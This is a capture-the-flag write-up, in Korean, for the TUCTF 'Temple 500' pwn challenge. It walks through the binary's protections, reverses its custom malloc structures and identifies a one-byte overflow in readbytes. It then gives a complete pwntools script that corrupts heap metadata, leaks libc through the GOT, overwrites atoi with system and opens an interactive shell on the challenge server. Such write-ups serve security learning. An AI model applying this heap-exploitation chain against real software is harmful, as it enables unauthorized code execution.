Temple 500 (pwn)
=============

### 1. Introduction

| RELRO         | STACK CANARY | NX         | PIE    | RPATH    | RUNPATH    | FILE   |
|---------------|--------------|------------|--------|----------|------------|--------|
| Partial RELRO | Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | temple | 

64 bit binary이며 https://tuctf.asciioverflow.com/files/1f9420bff145019e01b2446288e8dd37/mm.c 소스로 만들어진 custom malloc/custome free를 바이너리 내부에서 사용한다.

### 2. Reversing
```c
// wisdom struct

struct chunk
{
  int content_len;
  char *content;
  int m_check_len;
  char *m_check;
};
```

[1] Take wisdom  
- write(1, *content, content_len);
- write(1, *m_check, m_check_len);
- 만약에 m_check가 'Neonate\n'면 a1+8을 mm_free하며 그게 아니면 일반적인 mm_free를 한다.

[2] Give wisdom  
- 32byte chunk struct를 할당하고 content를 입력받고 m_check를 Neonate로 바꾼다.

[3] Rethink wisdom  
- content_len에 맞게 content를 입력받는다.

### 3. Vulnerability
```c
__int64 __fastcall readbytes(char *a1, int a2)
{
  fgets(a1, a2 + 1, stdin);
  return (a2 + 1);
}
```

readbytes 함수에서 size+1만큼 입력받아서 1byte overflow가 발생한다. 이것을 이용하여 익스플로잇을 할 수 있다.

### 4. Exploit

할당하는 chunk의 struct가 기본 malloc의 struct와 다른점은 prev_size와 size영역이 free가 되지 않더라도 둘다 남아있다는 점이다. 이 두개를 free할때 free청크가 두개있으면 청크 size를 합쳐서 큰 청크로 만들어주는데, 1byte overflow로 prev_size를 overwrite하여 원하는 힙 위치에 원하는 size를 입력시킬 수 있다.
이를 이용해서 content_len을 큰 사이즈로 overwrite하면 heap_overflow를 일으킬 수 있다. Rethink와 Take를 이용하여 leak과 got overwrite를 해서 풀 수 있다.

``` python
from pwn import *

e = ELF('./temple')
s = remote('temple.tuctf.com', 4343)
l = ELF('./libc.so.6')

def take(index):
	s.sendlineafter('Your choice: ','1')
	s.sendlineafter('seek?: ',index)

def give(size,content):
	s.sendlineafter('Your choice: ','2')
	s.sendlineafter('hold?: ',size)
	s.sendlineafter('wisdom?: ',content)

def rethink(index,content):
	s.sendlineafter('Your choice: ','3')
	s.sendlineafter('rethink?: ',index)
	s.sendlineafter('differently?: ',content)

give(str(0x10),'A' * 0x9)
give(str(0x10),p64(0x21) + p64(0xf0-0x30))
give(str(0x10),'A' * 0x9)
give(str(0x10),'A' * 0x9)
give(str(0x10),'A' * 0x9)
give(str(0x10),'B' * 0x9)
give(str(0x10),'A' * 0x9)
give(str(0x10),'A' * 0x9)
give(str(0x10),'A' * 0x9)
give(str(0x10),'A' * 0x9)
rethink('10','C' * 0x10 + '\x60') # 1byte overflow
take('11')
give(str(0x10),'C' * 0x9)


payload = 'A' * 0x10

# chunk 1
payload += p64(0x21) + p64(0x31) + p64(0x20) + p64(e.got['atoi'])
payload += p64(0x8) + p64(0x401d61)

# chunk 2
payload += p64(0x31) + p64(0x21) + 'A' * 0x10

# chunk 3
payload += p64(0x21) + p64(0x31) + p64(0x240) + p64(0x602f50)
payload += p64(0x8) + p64(0x401d60)

# chunk 4
payload += p64(0x31) + p64(0x21) + 'A' * 0x10

rethink('13',payload)
take('15')
s.recvuntil('\x7f')
s.recvuntil('\x7f')
s.recv(2)
print hex(u64(s.recv(8)[:6] + "\x00" * 2))
libc_base = u64(s.recv(8)[:6] + "\x00" * 2) - l.symbols['puts']
system = libc_base + l.symbols['system']

log.info('LIBC_BASE : ' + hex(libc_base))

rethink('14',p64(system))

s.interactive()
```


